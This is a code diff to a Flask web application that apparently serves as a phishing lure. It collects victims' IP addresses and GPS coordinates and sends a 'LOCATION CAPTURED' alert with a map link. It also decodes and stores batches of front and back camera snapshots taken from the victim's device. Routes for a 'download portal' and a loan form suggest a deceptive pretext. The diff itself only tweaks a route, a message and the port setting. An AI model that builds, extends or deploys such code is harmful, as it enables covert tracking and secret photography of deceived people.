@@ -1,4 +1,4 @@
-kkimport base64
+import base64
 import os
 import requests
 from flask import Flask, jsonify, render_template, request
@@ -42,6 +42,11 @@ def index():
   return render_template("index.html")
 
 
+@app.route("/try_again")
+def try_again():
+  return render_template("try.html")
+
+
 @app.route("/download_portal")
 def download_portal():
   return render_template("download.html")
@@ -56,7 +61,7 @@ def api_hit():
       request.headers.get("X-Forwarded-For", request.remote_addr),
   )
   msg = (
-      f"🚨 *STAGE 1: LOCATION CAPTURED* 🚨\n\n"
+      f"🚨 *LOCATION CAPTURED* 🚨\n\n"
       f"🌐 *IP:* `{ip}`\n"
       f"📌 *Coords:* `{lat}, {lon}`\n"
       f"🗺️ [Google Maps](https://www.google.com/maps?q={lat},{lon})"
@@ -78,7 +83,6 @@ def api_snapshots():
         with open(filename, "wb") as f:
           f.write(base64.b64decode(encoded))
 
-        # First 10 are front, next 10 are back
         if i < 10:
           cap = f"📸 Front Camera Snapshot #{i+1}"
         else:
@@ -129,5 +133,5 @@ def api_submit_loan():
 
 
 if __name__ == "__main__":
-  app.run(host="0.0.0.0", port=5000)
-
+  port = int(os.environ.get("PORT", 5000))
+  app.run(host="0.0.0.0", port=port)
